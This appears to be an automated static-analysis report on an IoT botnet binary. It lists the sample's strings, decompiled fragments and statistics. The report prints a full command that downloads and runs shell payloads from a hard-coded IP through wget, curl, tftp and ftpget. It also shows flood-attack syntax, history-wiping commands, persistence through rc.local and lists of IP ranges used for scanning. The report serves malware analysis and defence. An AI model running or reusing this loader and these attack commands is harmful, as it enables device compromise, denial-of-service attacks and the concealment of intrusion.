=============================================================================
========	BINARY ID :45460ceeac009f9f40cb6ee2164cb966f7a7c364==================================================
================================================================================
================================================================================
========	STRINGS SUMMARY : =====================================================
================================================================================
TOTAL STRINGS COUNT :1615
SUPSCPECTED LINES COUNT :180
SUPSCPECTED STRINGS COUNT (DISTINCT) :31
SUPSCPECTED STRINGS WEIGHT :120
SUSPECT STRING SCORE : [120 / 150] 80%
USER AGENTS STRINGS COUNT :9
STATIC IPs STRINGS COUNT :2
DYNAMIC IPs STRINGS COUNT :198
================================================================================
========	STRINGS DETAILS : =====================================================
================================================================================
================================================================================
========	SUSPECTED STRINGS : =====================================================
================================================================================
bin*
botnet
swatnet
fucknet
cracknet
weednet
gaynet
queernet
ballnet
unet
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.179/bins.sh; curl -O http://208.67.1.179/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 208.67.1.179 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 208.67.1.179; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 208.67.1.179 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n
telnet
/dev/netslink/
/usr/
/bin/sh
/proc/cpuinfo
PING
Failed opening raw socket.
Invalid flag "%s"
pkill -9 
pkill -9 "
Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n
SCANNER
STOPPING SCANNER
STARTING SCANNER ON -> %s
COMMENCING BOT KILL ON -> %s
UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>
TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)
HTTP
HTTPFLOOD
CNC <target> <port> <time>
STD <target> <port> <time>
KILLATTK
Killed %d.
None Killed.
/proc/net/route
TOXICNET
/etc/rc.d/rc.local
fork failed\n
 !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
No such process
Interrupted system call
No child processes
Too many open files in system
Read-only file system
Level 2 not synchronized
Machine is not on the network
Name not unique on network
Interrupted system call should be restarted
Socket operation on non-socket
Protocol wrong type for socket
Socket type not supported
Network is down
Network is unreachable
Network dropped connection on reset
Software caused connection abort
Connection reset by peer
Transport endpoint is already connected
Transport endpoint is not connected
Connection timed out
Connection refused
Host is down
No route to host
Operation already in progress
Operation now in progress
/bin/sh
 !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~
/etc/hosts
/etc/config/hosts
fdopen_pids
libc/sysdeps/linux/arm/vfork.S
fork.c
getpid.c
kill.c
sigprocmask.c
waitpid.c
spec_flags.4142
strstr.c
_string_syserrmsgs.c
inet_ntoa.c
inet_makeaddr.c
gethostbyname.c
gethostbyname_r.c
connect.c
socket.c
rand.c
random.c
randtbl
random_r.c
random_poly_info
system.c
libc/sysdeps/linux/arm/sigrestorer.S
inet_aton.c
dnslookup.c
get_hosts_byname_r.c
inet_pton4
inet_ntop4
read_etc_hosts_r.c
__read_etc_hosts_r
waitpid
random
connect
GetRandomPublicIP
numpids
initConnection
inet_pton
sendTCP
__GI_random_r
getpid
getHost
__libc_getpid
makeRandomStr
sendHTTP
GetRandomIP
system
__open_etc_hosts
__dns_lookup
random_r
gethostbyname_r
tcpcsum
socket
_string_syserrmsgs
__GI_inet_ntoa
srandom_r
__GI_inet_ntoa_r
sendHTTP2
__GI_srandom_r
kill
__GI_sigprocmask
inet_addr
connectTimeout
__GI_kill
strstr
init_rand
rand
__GI_gethostbyname_r
__GI_inet_ntop
fork
__GI_gethostbyname
__GI_random
__GI_fork
__GI_getpid
inet_aton
processCmd
get_telstate_host
__GI_socket
listFork
srand
sendUDP
inet_ntoa
__libc_system
__get_hosts_byname_r
botkiller
__GI_inet_pton
gethostbyname
__vfork
knownBots
__libc_waitpid
socket_connect
__GI_waitpid
vfork
srandom
__libc_fork
scanPid
rand_cmwc
inet_ntoa_r
__GI_strstr
__GI_connect
inet_ntop
__GI_inet_aton
__GI_vfork
__GI_inet_addr
__libc_connect
pids
sigprocmask
.ëꀰϡꀀ￡ꀐ㧣 ëꀰ￡̰賢鼯ǥ숰童.ëꀰϡꀀ￡ꀐャ ëꀰ￡̰棢鼯˥숰燥.ëꀰϡꀀ￡ꀐ⟣ ëꀰ￡̰䓢鼯ϥ숰棥.ëꀰϡꀀ￡ꀐợ ëꀰ￡̰⃢鼯ӥ숰忥.ëꀰϡꀀ탡ꀐᗣ ëꀰსରქᬰå匀ৣ
\tëꀰǡ茰Ϣꀀ瓡\rëꀰϡꀐ뗡ꀴ쏣ꀺӡꀡᓡ䬀â舠Ϡ舰à茐ⓥᬠ뗥ꀴ쏣ꀺˡꀡᓡ䬐Ǣ舠Ϡ舰à鍀⃥ᬰϥꀀ맡\tëꀰǡ茰Ӣꀠˡꀀáꀐϣꀠ苡\t⓫ᬠ뗥ꀴ쏣ꀺˡꀡᓡ䬀â舠Ϡ舰à錰⃥ᬠϥꀀˡꀐૡ\n⓫ᬰǥ茰ⓢରåꀀᓣ鼑㓥\vëꀰ⃡ର⃥ᬰå匀쇣
================================================================================
========	USER AGENTS STRINGS : =====================================================
================================================================================
Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)
Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5
Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0
Opera/6.04 (Windows XP; U) [en]
Opera/9.99 (X11; U; sk)
Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n
================================================================================
========	STATIC IP ADRESSES : =====================================================
================================================================================
208.67.1.179:23
8.8.8.8
================================================================================
========	DYNAMIC IP MASKS : =====================================================
================================================================================
112.5.%d.%d
117.165.%d.%d
85.3.%d.%d
37.158.%d.%d
95.9.%d.%d
41.252.%d.%d
58.71.%d.%d
104.55.%d.%d
78.186.%d.%d
78.189.%d.%d
221.120.%d.%d
88.5.%d.%d
41.254.%d.%d
103.20.%d.%d
103.47.%d.%d
103.57.%d.%d
45.117.%d.%d
101.51.%d.%d
137.59.%d.%d
1.56.%d.%d
1.188.%d.%d
14.204.%d.%d
27.0.%d.%d
27.8.%d.%d
27.50.%d.%d
27.54.%d.%d
27.98.%d.%d
27.112.%d.%d
27.192.%d.%d
36.32.%d.%d
36.248.%d.%d
39.64.%d.%d
42.4.%d.%d
42.48.%d.%d
42.52.%d.%d
42.56.%d.%d
42.63.%d.%d
42.84.%d.%d
42.176.%d.%d
42.224.%d.%d
43.253.%d.%d
43.230.%d.%d
163.53.%d.%d
62.252.%d.%d
43.245.%d.%d
62.255.%d.%d
123.25.%d.%d
103.54.%d.%d
27.255.%d.%d
103.204.%d.%d
123.24.%d.%d
113.191.%d.%d
81.100.%d.%d
113.188.%d.%d
113.189.%d.%d
94.174.%d.%d
14.160.%d.%d
14.161.%d.%d
14.162.%d.%d
14.163.%d.%d
14.164.%d.%d
14.165.%d.%d
14.166.%d.%d
14.167.%d.%d
14.168.%d.%d
14.169.%d.%d
14.170.%d.%d
14.171.%d.%d
14.172.%d.%d
14.173.%d.%d
14.174.%d.%d
14.175.%d.%d
14.176.%d.%d
14.177.%d.%d
14.178.%d.%d
14.179.%d.%d
14.180.%d.%d
14.181.%d.%d
14.182.%d.%d
14.183.%d.%d
14.184.%d.%d
14.185.%d.%d
14.186.%d.%d
14.187.%d.%d
14.188.%d.%d
14.189.%d.%d
14.190.%d.%d
14.191.%d.%d
45.121.%d.%d
45.120.%d.%d
45.115.%d.%d
43.252.%d.%d
43.240.%d.%d
41.174.%d.%d
49.118.%d.%d
78.188.%d.%d
45.127.%d.%d
103.30.%d.%d
14.33.%d.%d
123.16.%d.%d
202.44.%d.%d
116.93.%d.%d
91.83.%d.%d
41.253.%d.%d
117.173.%d.%d
113.190.%d.%d
146.88.%d.%d
112.196.%d.%d
113.178.%d.%d
112.45.%d.%d
183.223.%d.%d
116.71.%d.%d
103.44.%d.%d
110.235.%d.%d
124.253.%d.%d
211.237.%d.%d
117.175.%d.%d
178.93.%d.%d
111.9.%d.%d
222.252.%d.%d
113.174.%d.%d
113.160.%d.%d
113.161.%d.%d
113.162.%d.%d
113.163.%d.%d
113.164.%d.%d
113.165.%d.%d
113.166.%d.%d
113.167.%d.%d
113.168.%d.%d
113.169.%d.%d
123.17.%d.%d
123.18.%d.%d
123.19.%d.%d
123.20.%d.%d
123.21.%d.%d
123.22.%d.%d
222.253.%d.%d
222.254.%d.%d
222.255.%d.%d
37.247.%d.%d
41.208.%d.%d
183.220.%d.%d
175.201.%d.%d
103.198.%d.%d
50.205.%d.%d
88.248.%d.%d
88.105.%d.%d
88.247.%d.%d
85.105.%d.%d
188.3.%d.%d
103.203.%d.%d
103.55.%d.%d
103.220.%d.%d
183.233.%d.%d
103.242.%d.%d
103.14.%d.%d
103.195.%d.%d
103.214.%d.%d
103.218.%d.%d
103.225.%d.%d
103.228.%d.%d
103.231.%d.%d
103.60.%d.%d
103.248.%d.%d
103.253.%d.%d
103.255.%d.%d
103.35.%d.%d
103.49.%d.%d
103.62.%d.%d
144.48.%d.%d
163.47.%d.%d
223.29.%d.%d
59.153.%d.%d
113.176.%d.%d
113.175.%d.%d
113.177.%d.%d
113.183.%d.%d
202.164.%d.%d
203.134.%d.%d
210.56.%d.%d
49.156.%d.%d
203.210.%d.%d
117.181.%d.%d
117.178.%d.%d
117.177.%d.%d
117.176.%d.%d
117.170.%d.%d
117.171.%d.%d
117.162.%d.%d
112.26.%d.%d
112.27.%d.%d
112.28.%d.%d
112.29.%d.%d
112.30.%d.%d
112.31.%d.%d
203.150.%d.%d
50.233.%d.%d
================================================================================
========	/proc FOLDER ACCESS : =====================================================
================================================================================
/proc/cpuinfo
/proc/net/route
================================================================================
========	HISTORY TEMPERING : =====================================================
================================================================================
history -c;history -w
cd /root;rm -rf .bash_history
ClearHistory
================================================================================
========	AUTOINSTALL COMMANDS : =====================================================
================================================================================
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.179/bins.sh; curl -O http://208.67.1.179/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 208.67.1.179 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 208.67.1.179; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 208.67.1.179 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n
================================================================================
========	FUNCTIONS SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES			: 71005
+++TOTAL FUNCTIONS 			:271
+++LINES PER FUNCTION RATIO 	: 262.011070110701
+++SUSPECTED LINES COUNT 	: 1401
+++SUSPECTED LINES RATIO 	: 1.97310048588128
================================================================================
========	WHILES SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES				: 71005
+++WHILE (TRUE) LINES			: 13950
+++WHILE (TRUE) LINES RATION		:19.6465037673403%
+++WHILE (TRUE) LOOPS COUNT		: 207
================================================================================
========	SYSTEM FILES SUMMARY : ================================================
================================================================================
    char (*v79)[430] = " cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.179/bins.sh; curl -O http://208.67.1.179/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 208.67.1.179 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 208.67.1.179; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 208.67.1.179 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n";
        "/dev/netslink/",
        "/tmp/",
        "/var/",
        "/dev/",
        "/var/run/",
        "/dev/shm/",
        "/boot/",
        "/usr/",
        "/opt/"
            execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
        execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
        execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
    execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
    int32_t v152 = __libc_open("/proc/cpuinfo", 0); // 0x9608
    int32_t v154 = __libc_open("/proc/cpuinfo", 0); // 0x9840
    __libc_system((int32_t)"cd /root;rm -rf .bash_history");
    return __libc_system((int32_t)"cd /var/tmp; rm -f *");
        int32_t v157 = __libc_open("/proc/net/route", 0); // 0x11b64
    int32_t v146 = __GI_fopen((int32_t)"/etc/rc.d/rc.local", (int32_t)"r"); // 0x11e40
    char * v148 = "/etc/rc.d/rc.local";
        v147 = __GI_fopen((int32_t)"/etc/rc.conf", (int32_t)"r");
        v148 = "/etc/rc.conf";
                                int32_t v168 = __GI_fopen((int32_t)v148, (int32_t)&v167); // 0x11fc8
int32_t __GI_fopen(int32_t a1, int32_t a2) {
    return _stdio_fopen();
int32_t _stdio_fopen(void) {
            execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, v155);
    int32_t result2 = __libc_open("/dev/null", a2); // 0x17064
    int32_t v153 = __GI_fopen((int32_t)"/etc/resolv.conf", (int32_t)&v152); // 0x19434
        int32_t v156 = __GI_fopen((int32_t)"/etc/config/resolv.conf", (int32_t)&v152); // 0x19448
    int32_t result = __GI_fopen((int32_t)"/etc/hosts", (int32_t)&v151); // 0x1a6c0
        return __GI_fopen((int32_t)"/etc/config/hosts", (int32_t)&v151);
================================================================================
========	IP PATTERNS SUMMARY : =================================================
================================================================================
        "208.67.1.179:23"

    char (*v77)[16] = "208.67.1.179:23";

    char (*v79)[430] = " cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.179/bins.sh; curl -O http://208.67.1.179/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 208.67.1.179 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 208.67.1.179; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 208.67.1.179 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n";

        szprintf(v151, (int32_t)"112.5.%d.%d", (int32_t)v152, (int32_t)v153, 0);

        szprintf(v151, (int32_t)"117.165.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"85.3.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"37.158.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"95.9.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"41.252.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"58.71.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"104.55.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"78.186.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"78.189.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"221.120.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"88.5.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"41.254.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"103.20.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"103.47.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"103.57.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"45.117.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"101.51.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"137.59.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"1.56.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"1.188.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.204.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"27.0.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"27.8.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"27.50.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"27.54.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"27.98.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"27.112.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"27.192.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"36.32.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"36.248.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"39.64.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"42.4.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"42.48.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"42.52.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"42.56.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"42.63.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"42.84.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"42.176.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"42.224.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"42.176.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"43.253.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"43.230.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"163.53.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"43.230.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"62.252.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"43.245.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"62.255.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"123.25.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"103.54.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"27.255.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"103.204.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"123.24.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"113.191.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"81.100.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"113.188.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"113.189.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"94.174.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.160.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.161.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.162.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.163.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.164.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.165.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.166.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.167.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.168.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.169.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.170.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.171.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.172.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.173.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.174.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.175.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.176.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.177.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.178.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.179.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.180.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.181.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.182.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.183.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.184.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.185.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.186.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.187.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.188.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.189.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.190.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.191.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"45.121.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"45.120.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"45.115.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"43.252.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"43.230.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"43.240.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"43.245.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"41.174.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"49.118.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"78.188.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"45.127.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"103.30.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"14.33.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"123.16.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"202.44.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"116.93.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"91.83.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"41.253.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"117.173.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"113.190.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"146.88.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"112.196.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"113.178.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"112.45.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"183.223.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"116.71.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"103.44.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"110.235.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"124.253.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"211.237.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"117.175.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"117.173.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"178.93.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"111.9.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"222.252.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"113.174.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"222.252.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"113.160.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"113.161.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"113.162.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

        szprintf(v151, (int32_t)"113.163.%d.%d", (int32_t)v152, (int32_t)v153, (int32_t)&v155);

